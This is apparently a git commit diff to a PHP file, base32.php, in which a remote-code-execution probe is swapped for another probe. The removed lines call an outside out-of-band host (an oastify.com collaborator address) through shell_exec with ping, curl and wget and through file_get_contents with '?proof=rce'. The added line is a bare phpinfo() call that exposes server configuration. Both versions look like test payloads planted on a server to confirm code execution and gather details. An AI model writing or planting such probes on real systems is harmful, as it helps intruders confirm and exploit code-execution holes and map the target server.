f6922dd1169b318628b2aa701c70d1ac3ff432fa
vivekexe211 <poojaryvivek76@gmail.com>
2026-01-14 16:54:37 +0530

    Update base345.php

--- base32.php
+++ base32.php
@@ -1,10 +1,1 @@
-<?php
-// Ping collaborator to prove execution
-$collab = "gxh6anxkavv44romutrxq9lroiu9i0co1.oastify.com";
-shell_exec("ping -c 1 $collab 2>&1");
-shell_exec("curl http://$collab 2>&1");
-shell_exec("wget http://$collab 2>&1");
-
-// Or use PHP's file_get_contents
-file_get_contents("http://$collab/?proof=rce");
-?>
+<?php phpinfo(); ?>
